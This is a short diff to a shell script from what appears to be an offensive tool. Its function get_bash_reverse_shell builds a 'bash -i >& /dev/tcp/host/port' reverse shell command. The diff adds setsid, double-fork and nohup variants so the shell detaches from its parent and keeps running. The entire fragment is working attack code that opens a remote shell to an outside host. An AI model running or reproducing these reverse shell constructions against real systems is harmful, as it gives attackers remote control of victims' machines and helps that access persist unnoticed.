@@ -19,7 +19,13 @@ prepare_generic_linux_shell() {
 get_bash_reverse_shell() {
     prepare_generic_linux_shell
     local reverse_shell='bash -i >& /dev/tcp/'"$host_ip"'/'"$host_port"' 0>&1'
-    if [[ -z "$no_hup" ]] || [[ "$no_hup" == "true" ]]; then
+    if [[ ! -z "$use_setsid" ]] && [[ "$use_setsid" == "true" ]]; then
+        reverse_shell='setsid '"$reverse_shell"' &'
+    elif [[ ! -z $use_double_fork ]] && [[ "$use_double_fork" == "true" ]]; then
+        reverse_shell='( ('"$reverse_shell"') & ) &'
+    elif [[ ! -z $use_nohup ]] && [[ "$use_nohup" == "true" ]]; then
+        reverse_shell='nohup '"$reverse_shell"' &'
+    elif [[ -z "$no_hup" ]] || [[ "$no_hup" == "true" ]]; then
         reverse_shell='nohup '"$reverse_shell"' &'
     fi
     if [[ ! -z "$reverse_type" ]] && [[ $reverse_type == "java_exec" ]]; then
